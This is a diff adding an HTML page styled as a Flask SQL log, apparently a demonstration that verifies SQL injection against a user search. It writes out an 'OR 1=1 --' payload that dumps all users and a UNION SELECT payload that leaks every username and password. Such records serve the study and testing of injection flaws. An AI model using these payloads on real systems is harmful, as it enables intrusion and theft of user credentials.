@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>SQL Log</title>
+<style>
+body { background:#1e1e1e; color:#d4d4d4; font:14px 'Courier New',monospace; padding:20px; }
+.pre { white-space:pre; }
+.green { color:#6a9955; }
+.cyan { color:#569cd6; }
+.yellow { color:#dcdcaa; }
+.red { color:#ce9178; }
+</style></head><body>
+<div class="pre">
+<span class="green"># Flask SQL Log - 验证SQL注入成功执行</span>
+
+<span class="cyan">[SQL]</span> SELECT id, username, email, phone FROM users
+       WHERE username LIKE <span class="red">'%admin%'</span> OR email LIKE <span class="red">'%admin%'</span>
+<span class="green"># 正常搜索 - 返回admin用户</span>
+
+<span class="cyan">[SQL]</span> SELECT id, username, email, phone FROM users
+       WHERE username LIKE <span class="red">'%%'</span> OR 1=1 --<span class="red">%'</span>
+       OR email LIKE <span class="red">'%%'</span> OR 1=1 --<span class="red">%'</span>
+<span class="yellow"># SQL注入成功! OR 1=1 使条件永真，返回所有用户</span>
+
+<span class="cyan">[SQL]</span> SELECT id, username, email, phone FROM users
+       WHERE username LIKE <span class="red">'%'</span> UNION SELECT id,username,password,email
+       FROM users --<span class="red">%'</span>
+       OR email LIKE <span class="red">'%'</span> UNION SELECT id,username,password,email
+       FROM users --<span class="red">%'</span>
+<span class="red"># SQL注入成功! UNION SELECT 泄露所有用户密码!</span>
+</div>
+</body></html>
